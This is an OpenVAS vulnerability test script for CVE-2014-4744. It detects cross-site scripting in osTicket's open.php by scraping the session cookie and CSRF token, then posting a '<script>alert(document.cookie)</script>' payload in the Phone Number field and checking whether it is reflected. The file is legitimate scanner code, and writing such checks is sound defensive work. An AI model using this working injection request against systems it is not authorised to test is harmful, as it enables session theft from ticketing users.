###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_osticket_mult_xss_vuln.nasl 12877 2018-12-21 17:09:19Z cfischer $
#
# osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:osticket:osticket";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804823");
  script_version("$Revision: 12877 $");
  script_cve_id("CVE-2014-4744");
  script_bugtraq_id(68500);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-12-21 18:09:19 +0100 (Fri, 21 Dec 2018) $");
  script_tag(name:"creation_date", value:"2014-08-26 13:09:40 +05340 (Tue, 26 Aug 2014)");
  script_name("osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("osticket_detect.nasl");
  script_mandatory_keys("osticket/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/59539");
  script_xref(name:"URL", value:"https://www.netsparker.com/critical-xss-vulnerabilities-in-osticket/");

  script_tag(name:"summary", value:"This host is installed with osTicket Ticketing System and is prone to multiple
  cross-site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check whether it is able to read cookie
  or not.");

  script_tag(name:"insight", value:"Multiple flaws exist as input passed via 'Phone Number' POST parameter to the
  'open.php' script, 'Phone Number', 'passwd1', 'passwd2' POST parameters to 'account.php' script, and 'do' parameter
  to 'account.php' script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
  code in a user's browser session within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"osTicket before version 1.9.2.");

  script_tag(name:"solution", value:"Upgrade to osTicket version 1.9.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

req = http_get(item:string(dir, "/upload/open.php"), port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res && "powered by osTicket<" >< res) {

  cookie = eregmatch(pattern:"Set-Cookie: OSTSESSID=([0-9a-z]*);", string:res);
  if(!cookie[1])
    exit(0);

  csrf_token = eregmatch(pattern:'csrf_token" content="([0-9a-z]*)"', string:res);
  if(!csrf_token[1])
    exit(0);

  email_id = eregmatch(pattern:'<label for="([0-9a-z]*)" class="required".*Email Address:', string:res);
  if(!email_id[1])
    exit(0);

  res = ereg_replace(pattern:'.*Email Address:', string:res, replace: "Email Address:");

  full_name = eregmatch(pattern: 'Email Address:.*<label for="([0-9a-z]*)" class="required".*Full Name:', string:res);
  if(!full_name[1])
    exit(0);

  res = ereg_replace(pattern:'.*Full Name:', string:res, replace: "Full Name:");

  phone_no = eregmatch(pattern:'Full Name:.*<label for="([0-9a-z]*)" class="".*Phone Number:', string:res);
  if(!phone_no[1])
    exit(0);

  res = ereg_replace(pattern:'.*Phone Number:', string:res, replace: "Phone Number:");

  ext = eregmatch(pattern:'Ext:.*<input type="text" name="([0-9a-z]*)-ext"', string:res);
  if(!ext[1])
    exit(0);

  res = ereg_replace(pattern:'.*-ext', string:res, replace: "-ext");

  issue = eregmatch(pattern:'<label for="([0-9a-z]*)" class="required".*Issue Summary:', string:res);
  if(!issue[1])
    exit(0);

  postData = string('-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="__CSRFToken__"\r\n\r\n', csrf_token[1], '\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="a"\r\n',
                    '\r\nopen\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="topicId"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="', email_id[1], '"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="', full_name[1], '"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="', phone_no[1], '"\r\n',
                    '\r\n',
                    '"--></style></script><script>alert(document.cookie)</script>\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="', ext[1], '-ext"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="', issue[1], '"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="message"\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="attachments[]"; filename=""\r\n',
                    'Content-Type: application/octet-stream\r\n',
                    '\r\n\r\n',
                    '-----------------------------10379450071263312649808858377\r\n',
                    'Content-Disposition: form-data; name="draft_id"\r\n',
                    '\r\n4\r\n',
                    '-----------------------------10379450071263312649808858377--\r\n');

  url = dir + "/upload/open.php";
  req  = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Cookie: OSTSESSID=", cookie[1], "\r\n",
                "Content-Type: multipart/form-data;boundary=---------------------------10379450071263312649808858377\r\n",
                "Content-Length: ", strlen(postData), "\r\n\r\n",
                "\r\n", postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req );
  if(res =~ "^HTTP/1\.[01] 200" && "></script><script>alert(document.cookie)</script>" >< res && "osTicket<" >< res) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);